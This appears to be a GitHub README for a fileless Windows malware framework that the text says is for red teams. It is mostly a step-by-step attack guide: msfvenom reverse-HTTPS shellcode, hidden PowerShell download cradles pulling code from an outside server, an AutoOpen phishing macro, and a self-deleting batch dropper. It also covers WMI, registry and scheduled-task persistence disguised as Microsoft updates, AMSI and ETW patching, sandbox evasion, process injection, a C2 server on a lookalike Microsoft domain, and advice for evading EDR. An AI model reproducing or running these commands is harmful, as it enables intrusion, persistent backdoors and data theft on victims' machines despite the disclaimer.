<div align="center">
  <img src="assets/logo.png" alt="File-Less-Malware Logo" width="220"/>

  <h1>File-Less-Malware</h1>
  <p><strong>Advanced Fileless Malware Framework for Red Team Operations</strong></p>
  <p><em>For authorized security testing only</em></p>

  <br/>

  [![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
  [![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=flat-square&logo=powershell&logoColor=white)](https://microsoft.com/powershell)
  [![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)](https://microsoft.com)
  [![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
  [![Stages](https://img.shields.io/badge/Stages-5-blueviolet?style=flat-square)](#architecture)
  [![C2](https://img.shields.io/badge/C2-DNS%20%2B%20HTTPS-orange?style=flat-square)](#c2-server-setup)
  [![Red Team](https://img.shields.io/badge/Use-Red%20Team%20Only-red?style=flat-square)](#legal--ethical-use)

</div>

---

## Table of Contents

1. [Overview](#overview)
2. [What Makes This "Fileless"?](#what-makes-this-fileless)
3. [Architecture](#architecture)
4. [Prerequisites](#prerequisites)
5. [Installation & Setup](#installation--setup)
6. [Step-by-Step Deployment Guide](#step-by-step-deployment-guide)
7. [C2 Server Setup](#c2-server-setup)
8. [Execution Methods](#execution-methods)
9. [Persistence Mechanisms](#persistence-mechanisms)
10. [Evasion Techniques](#evasion-techniques)
11. [Detection & OPSEC Considerations](#detection--opsec-considerations)
12. [Troubleshooting](#troubleshooting)
13. [Legal & Ethical Use](#legal--ethical-use)
14. [Signed](#signed)

---

## Overview

File-Less-Malware is a multi-stage fileless malware framework designed for red team engagements and authorized penetration tests. It operates entirely in memory — no executables, scripts, or payloads are ever written to disk. The framework uses living-off-the-land binaries (LOLBins), Windows API injection, WMI persistence, and dual-channel C2 communication to establish persistent, stealthy access to target Windows systems.

This is not a script kiddie tool. It implements advanced evasion techniques including AMSI patching, ETW suppression, sandbox detection, encrypted shellcode transport, and process injection with memory protection manipulation.

---

## What Makes This "Fileless"?

Traditional malware writes an executable or script file to disk, which antivirus can scan at rest. File-Less-Malware avoids this entirely:

| Attack Phase | What Touches Disk | What Stays in Memory |
|---|---|---|
| Initial execution | Nothing | Encoded PowerShell command runs directly |
| AMSI/ETW bypass | Nothing | API memory patching |
| Shellcode | Nothing | XOR-encrypted in transit, decrypted in memory only |
| Process injection | Nothing | VirtualAllocEx + WriteProcessMemory in target process |
| Persistence | WMI Repository (system file, not user-writable) | No `.exe`, `.dll`, `.ps1`, `.vbs`, `.bat` on disk |
| C2 communication | Nothing | DNS queries + HTTPS requests (normal network traffic) |

The WMI repository is a system-managed database — you cannot simply delete a WMI subscription by removing a file. This makes forensic removal significantly harder than traditional persistence methods.

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│                    File-Less-Malware Framework                       │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Execution Order:                                                    │
│                                                                      │
│  1. STAGE 0 — Defense Bypass                                         │
│     ├── AmsiUtils amsiInitFailed = true                              │
│     ├── AmsiScanBuffer memory patch (xor rax,rax; ret)               │
│     └── EtwEventWrite memory patch (xor rax,rax; ret)                │
│                                                                      │
│  2. STAGE 1 — Sandbox Evasion                                        │
│     ├── BIOS serial check (VM defaults)                              │
│     ├── System model check (VirtualBox, VMware, Hyper-V)             │
│     ├── RAM size check (< 4GB = sandbox)                             │
│     ├── Disk size check (< 60GB = sandbox)                           │
│     ├── Running process check (procmon, wireshark, debuggers)        │
│     ├── Username check (admin, test, sandbox, analysis)              │
│     └── Network gateway check (10.0.2.x = NAT)                      │
│                                                                      │
│  3. STAGE 2 — Shellcode Decryption                                   │
│     ├── Base64 decode                                                │
│     ├── Rolling XOR decryption (16-byte key)                         │
│     └── Shellcode ready in memory                                    │
│                                                                      │
│  4. STAGE 3 — Process Injection                                      │
│     ├── Find or spawn notepad.exe (sacrificial process)              │
│     ├── OpenProcess (PROCESS_ALL_ACCESS)                             │
│     ├── VirtualAllocEx (RW memory in target)                         │
│     ├── WriteProcessMemory (shellcode → target)                      │
│     ├── VirtualProtectEx (RW → RX, executable)                       │
│     └── CreateRemoteThread (execute)                                 │
│                                                                      │
│  5. STAGE 4 — Persistence (optional)                                 │
│     ├── WMI Event Subscription (primary)                             │
│     ├── Registry Run Key (backup)                                    │
│     └── Scheduled Task (tertiary)                                    │
│                                                                      │
│  6. STAGE 5 — C2 Beacon (infinite loop)                              │
│     ├── System info collection                                       │
│     ├── DNS tunneling beacon (subdomain exfiltration)                │
│     ├── HTTPS callback (command retrieval)                           │
│     └── Jittered sleep (entropy spin-loop)                           │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites

### Attacker Machine (Kali Linux / VPS)

| Requirement | Details |
|---|---|
| OS | Kali Linux 2024+ or Ubuntu 22.04+ |
| Python | 3.8+ |
| msfvenom | Metasploit Framework (`apt install metasploit-framework`) |
| Python packages | `dnslib` (`pip3 install dnslib`) |
| Root access | Required for DNS (port 53) and HTTPS (port 443) listeners |
| Domain | A domain you control (or use IP-only with limitations) |
| Public IP | VPS with ports 53/443 open (or forwarded) |

### Target Machine (Windows)

| Requirement | Details |
|---|---|
| OS | Windows 10/11, Windows Server 2019/2022 |
| PowerShell | Version 5.1+ |
| Privileges | Admin recommended for WMI persistence features |
| Network | Outbound DNS (port 53) and HTTPS (port 443) |
| Windows Defender | Will be bypassed by Stage 0 (amsiInitFailed) |

---

## Installation & Setup

### 1. Clone the Project

```bash
git clone https://github.com/skynetfc/file-less-malware.git
cd file-less-malware
```

### 2. Install Dependencies

```bash
# Python dependencies for C2 server
pip3 install dnslib

# Metasploit for shellcode generation
sudo apt update && sudo apt install -y metasploit-framework
```

### 3. Directory Structure

```
file-less-malware/
├── README.md
├── LICENSE
├── assets/
│   └── logo.png
├── builder/
│   ├── generate_payload.py      ← Shellcode + encryption generator
│   └── encrypt_shellcode.py     ← XOR encryption utility
├── payload/
│   ├── stage0_amsi_bypass.ps1   ← AMSI/ETW patching module
│   ├── stage1_sandbox_evasion.ps1 ← VM/sandbox detection
│   ├── stage2_injection.ps1     ← Process injection engine
│   ├── stage3_persistence.ps1   ← WMI/Registry persistence
│   ├── stage4_c2_beacon.ps1     ← C2 communication loop
│   └── loader.ps1               ← Master orchestrator (ALL stages)
├── c2/
│   ├── server.py                ← Combined HTTPS + DNS C2 server
│   ├── dns_server.py            ← Standalone DNS listener
│   └── requirements.txt
├── generated/                   ← Created by build process
│   ├── shellcode.raw
│   ├── shellcode.enc
│   └── stager.ps1
└── docs/
    └── OPERATIONS_GUIDE.md
```

---

## Step-by-Step Deployment Guide

### Phase 1: Generate the Payload

#### Step 1.1 — Generate Meterpreter Shellcode

On Kali Linux, run the payload generator:

```bash
cd file-less-malware/builder
python3 generate_payload.py \
  --lhost YOUR_C2_SERVER_IP \
  --lport 443 \
  --payload reverse_https \
  --arch x64 \
  --output ../generated
```

This will:
1. Run `msfvenom` to create staged reverse HTTPS shellcode
2. XOR-encrypt the shellcode with a 16-byte rolling key
3. Save the raw shellcode to `generated/shellcode.raw`
4. Save the encrypted shellcode to `generated/shellcode.enc`
5. Generate a standalone stager to `generated/stager.ps1`

**Flags explained:**

| Flag | Purpose | Example |
|---|---|---|
| `--lhost` | Your C2 server IP | `192.168.1.100` or `45.33.32.156` |
| `--lport` | Port for reverse connection | `443` (blends with HTTPS) |
| `--payload` | Shellcode type | `reverse_https` (encrypted, harder to detect) |
| `--arch` | Target architecture | `x64` (most modern systems) |

#### Step 1.2 — Get the Encrypted Payload String

```bash
cat ../generated/shellcode.enc | base64 | tr -d '\n'
```

Save this output — you'll need it for the next step.

### Phase 2: Configure the Loader

#### Step 2.1 — Edit `payload/loader.ps1`

Open `payload/loader.ps1` and find the `$config` block at the top.

**Change these values:**

| Variable | What to Put | Example |
|---|---|---|
| `C2Domain` | Your C2 domain or IP | `"c2.yourdomain.com"` |
| `C2Port` | C2 server port | `443` |
| `EncryptedShellcode` | The base64 string from Step 1.2 | (long base64 string) |

**Optional tuning:**

| Variable | Default | Description |
|---|---|---|
| `BeaconInterval` | `120` | Seconds between C2 callbacks |
| `JitterPercent` | `35` | Random delay variation (0–100) |
| `TargetProcess` | `notepad.exe` | Sacrificial process for injection |
| `PersistEnabled` | `$true` | Enable/disable persistence |

#### Step 2.2 — (Optional) Change XOR Encryption Key

1. Edit `builder/encrypt_shellcode.py` — change the `ENCRYPTION_KEY` bytes
2. Edit `payload/loader.ps1` — change `$config.EncryptionKey` to match
3. Regenerate the payload (re-run Step 1.1)

### Phase 3: Encode the Loader

#### Method A: One-Liner for Direct Execution

```powershell
$loaderPath = "C:\path\to\file-less-malware\payload\loader.ps1"
$content = Get-Content -Raw $loaderPath
$bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded
```

#### Method B: Download Cradle

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/loader.ps1')"
```

### Phase 4: Set Up the C2 Server

#### Step 4.1 — Start the C2 Server (as root)

```bash
sudo python3 c2/server.py \
  --domain update.microsoft-helpline.com \
  --http-port 443 \
  --dns-port 53 \
  --host 0.0.0.0
```

Expected output:

```
[2026-06-20 14:00:00] [C2] Domain: update.microsoft-helpline.com
[2026-06-20 14:00:00] [C2] HTTP: 0.0.0.0:443
[2026-06-20 14:00:00] [C2] DNS:  0.0.0.0:53
[2026-06-20 14:00:00] [C2] Waiting for beacons...
```

#### Step 4.2 — Configure DNS (if using a domain)

| Record Type | Name | Value | TTL |
|---|---|---|---|
| A | `update.microsoft-helpline.com` | `YOUR_C2_SERVER_IP` | 3600 |

#### Step 4.3 — Configure Metasploit Listener

```bash
msfconsole -q

msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > run -j
```

### Phase 5: Deploy on Target

#### Delivery via PowerShell (Direct)

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand $ENCODED_LOADER
```

#### Delivery via Download Cradle

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/loader.ps1')"
```

#### Delivery via Office Macro (Phishing)

```vbnet
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand ENCODED_LOADER_HERE", 0, False
End Sub
```

#### Delivery via Batch File

```batch
@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand ENCODED_LOADER_HERE
del %0
```

### Phase 6: Verify Implant Callback

Watch your C2 server logs:

```
[2026-06-20 14:05:32] [BEACON] 203.0.113.50 -> /api/telemetry
[2026-06-20 14:05:32] [IMPLANT] Hostname: DESKTOP-7F3K2L | User: jdoe | IP: 203.0.113.50
[2026-06-20 14:05:32] [DNS] Beacon from 203.0.113.50: RGVz... (truncated)
```

And in Metasploit:

```
[*] Meterpreter session 1 opened (YOUR_IP:443 -> TARGET_IP:54321)
```

---

## C2 Server Setup

### Option 1: All-in-One Server (Recommended)

```bash
sudo python3 c2/server.py \
  --domain yourdomain.com \
  --http-port 443 \
  --dns-port 53 \
  --host 0.0.0.0
```

### Option 2: Separate Services

```bash
# Terminal 1: DNS listener
sudo python3 c2/dns_server.py --port 53 --domain yourdomain.com

# Terminal 2: HTTP listener
sudo python3 c2/server.py --http-port 443
```

### What the C2 Server Logs

| Log Type | Example | What It Means |
|---|---|---|
| `[BEACON]` | `[BEACON] 203.0.113.50 -> /api/telemetry` | HTTPS callback received |
| `[IMPLANT]` | `Hostname: DESKTOP-ABC` | System info decoded from beacon |
| `[DNS]` | `Beacon from 203.0.113.50: aG9zdA==` | DNS subdomain beacon received |
| `[CMD]` | `Command sent: whoami` | C2 command dispatched to implant |

### Sending Commands to Implants

The C2 server embeds commands in HTTP responses using XML tags. The implant checks for `<c2>COMMAND</c2>` in the response body. Edit `server.py` to customize the command returned.

---

## Execution Methods

### Method 1: Encoded Command (100% Fileless)

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand <BASE64>
```

**Pros:** Nothing on disk. AV/EDR cannot scan the payload at rest.  
**Cons:** PowerShell command line may be logged (Event ID 4688, 4104).

### Method 2: Download Cradle

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/loader.ps1')"
```

**Pros:** Payload can be updated server-side without re-deploying.  
**Cons:** Network connection to your server may be logged.

### Method 3: WMI Launcher (Living off the Land)

```cmd
wmic process call create "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand <BASE64>"
```

### Method 4: Scheduled Task Execution

```cmd
schtasks /create /tn "WindowsUpdateTask" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand <BASE64>" /sc onlogon /ru SYSTEM /f
schtasks /run /tn "WindowsUpdateTask"
```

---

## Persistence Mechanisms

Once the loader establishes persistence (Stage 4), the implant will survive reboots using three layers:

### Layer 1: WMI Event Subscription (Primary)

| Component | Purpose |
|---|---|
| `__EventFilter` | Triggers on system performance counter changes (every 1 hour by default) |
| `CommandLineEventConsumer` | Executes the PowerShell re-infection command |
| `__FilterToConsumerBinding` | Connects the filter to the consumer |

**Why this is powerful:** The WMI repository is a system file (`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`). Antivirus cannot simply "delete" a WMI subscription — it would corrupt the entire repository. Most EDRs do not monitor WMI subscription creation by default.

### Layer 2: Registry Run Key (Backup)

| Registry Path | Value Name |
|---|---|
| `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` | `WindowsDefenderHealthUpdate_XXXXX` |

### Layer 3: Scheduled Task (Tertiary)

| Task Name | Trigger | Runs As |
|---|---|---|
| `MicrosoftEdgeUpdateTask_XXXXX` | Daily | SYSTEM |

All persistence mechanisms re-execute the same encoded PowerShell payload — no new files are ever created.

---

## Evasion Techniques

### AMSI Bypass (Stage 0)

Windows Defender's Antimalware Scan Interface scans PowerShell scripts before execution. File-Less-Malware uses multiple layered bypasses:

| Technique | How It Works |
|---|---|
| `amsiInitFailed` | Sets the `amsiInitFailed` field to `$true`, disabling AMSI for the session |
| `AmsiScanBuffer` memory patch | Overwrites the function with `xor rax,rax; ret` (returns 0 = clean) |
| Provider removal | Removes AMSI provider GUIDs from the registry |

### ETW Patching (Stage 0)

Event Tracing for Windows sends telemetry to EDR solutions. File-Less-Malware patches `EtwEventWrite` in `ntdll.dll` with `xor rax,rax; ret` — the function still exists but does nothing.

### Sandbox Evasion (Stage 1)

Before deploying the real payload, the loader checks for analysis environments:

| Check | Detection Target |
|---|---|
| BIOS serial number | VMware, VirtualBox, Hyper-V default serials |
| System model | Virtual machine model strings |
| RAM size | Sandboxes often have < 4 GB |
| Disk size | Sandboxes often have < 60 GB C: drives |
| Running processes | procmon, wireshark, Process Hacker, debuggers |
| Username | Common sandbox usernames |
| Network gateway | VirtualBox NAT gateway (10.0.2.x) |

If any indicator is found, the loader runs a benign decoy (simulates Windows Update) and exits cleanly.

### Encrypted Shellcode Transport

The shellcode is:
1. Generated by msfvenom
2. XOR-encrypted with a 16-byte rolling key
3. Base64-encoded for transmission
4. Only decrypted in memory at runtime

This defeats signature-based detection and network inspection.

### Process Injection (Stage 3)

The shellcode executes inside a legitimate Windows process (`notepad.exe` by default):

- `notepad.exe` is signed by Microsoft
- EDRs trust signed processes more than unsigned ones
- The injection uses raw Win32 API calls (not .NET wrappers)
- Memory is allocated RW, written, then changed to RX (never stays RWX)

### C2 Jitter (Stage 5)

The beacon interval includes random jitter:

- Base interval: 120 seconds
- Jitter: ±35% (random between ~78 and ~162 seconds)
- Sleep uses entropy collection loops instead of simple `Start-Sleep`

This defeats sandbox timing analysis and beacon detection rules.

---

## Detection & OPSEC Considerations

### What EDRs May See

| Artifact | What It Looks Like | How to Mitigate |
|---|---|---|
| PowerShell command line | Long base64 string in Event 4688 | Use shorter, fragmented commands |
| Process creation (notepad.exe) | PowerShell spawning notepad.exe | Use `svchost.exe` or `explorer.exe` instead |
| WMI subscription creation | New `__EventFilter` in root\subscription | Use longer random names, lower event frequency |
| Network connections | DNS queries to your domain | Use a legitimate-looking domain, add DNS padding |
| Memory allocation | VirtualAllocEx in notepad.exe | Use smaller shellcode, enable sleep obfuscation |

### Recommended OPSEC Improvements

| Area | Improvement |
|---|---|
| Domain | Register a domain that looks legitimate (e.g., `cdn-azure-static.net`) |
| Certificate | Use Let's Encrypt for valid TLS on your C2 server |
| Beacon timing | Set `BeaconInterval` to 300–600 seconds for low-and-slow |
| Target process | Use `svchost.exe` or `RuntimeBroker.exe` instead of notepad |
| Shellcode | Use staged payload (smaller initial shellcode) |
| Encryption | Change the XOR key per operation |
| Delivery | Use signed macros or exploit kits, not raw PowerShell |

### Lab Testing

Before deploying in an engagement, test against:

1. **Windows Defender** — Ensure AMSI bypass works
2. **Microsoft Defender for Endpoint** — Check for behavioral alerts
3. **Sysmon** — Review Event ID 1 (process creation), 7 (image load), 8 (CreateRemoteThread)
4. **Velociraptor** — Check for WMI subscription artifacts
5. **Your target's EDR** — If known, test specifically against it

---

## Troubleshooting

### "OpenProcess failed" / Access Denied

**Cause:** `PROCESS_ALL_ACCESS` requires admin rights.  
**Fix:** Run the loader as Administrator, or change `TargetProcess` to a process running under the same user account.

### No Beacons Received on C2 Server

| Cause | Check |
|---|---|
| DNS resolution | Does `nslookup yourdomain.com` resolve to your C2 IP? |
| Firewall | Are ports 53 (UDP) and 443 (TCP) open on your VPS? |
| Domain configuration | Is the A record pointing to the correct IP? |
| Network connectivity | Can the target reach your C2 server? |

### AMSI Still Blocks Execution

**Cause:** Some EDRs hook AMSI differently.  
**Fix:** Try patching `AmsiScanString` instead of `AmsiScanBuffer`, or use `[System.Reflection.Assembly]::Load` with obfuscated reflection.

### Shellcode Injection Fails

**Cause:** Target process architecture mismatch or EDR hooking.  
**Fix:** Ensure shellcode architecture matches the target process. Test with a simple `calc.exe` shellcode first.

### WMI Persistence Doesn't Survive Reboot

**Fix:** Verify the persistence command is correctly encoded. Test manually:

```powershell
$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE 'WindowsDefenderFilter_%'"
$filter | Format-List *
```

### C2 Server "Address Already in Use"

```bash
# Stop systemd-resolved (temporary)
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
```

---

## Legal & Ethical Use

### This tool is STRICTLY for:

- Authorized penetration tests with signed scope-of-work documents
- Red team exercises within your own organization
- Security research in isolated lab environments
- CTF competitions and training scenarios
- Educational demonstrations with student consent

### You MUST have:

1. **Explicit written authorization** from the system owner
2. **A defined scope** listing which systems and networks are in scope
3. **Rules of engagement** specifying allowed techniques
4. **A stop condition** — when and how to halt the operation

### You MUST NOT use this for:

- Systems you do not own or have written permission to test
- Bypassing security controls without authorization
- Exfiltrating data without explicit permission
- Installing backdoors for unauthorized access
- Any illegal activity under the Computer Fraud and Abuse Act (CFAA) or equivalent laws in your jurisdiction

### Liability

The authors and contributors of File-Less-Malware assume no liability for misuse of this framework. Users are responsible for compliance with all applicable laws and regulations in their jurisdiction.

---

## Signed

```
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿
⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿
⣿⣿⡇⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡄⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿
⣿⣿⣧⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
```

<div align="center">

**File-Less-Malware** — *Advanced Fileless Malware Framework*  
*For authorized security testing only*

**Signed: skynetfc**

</div>
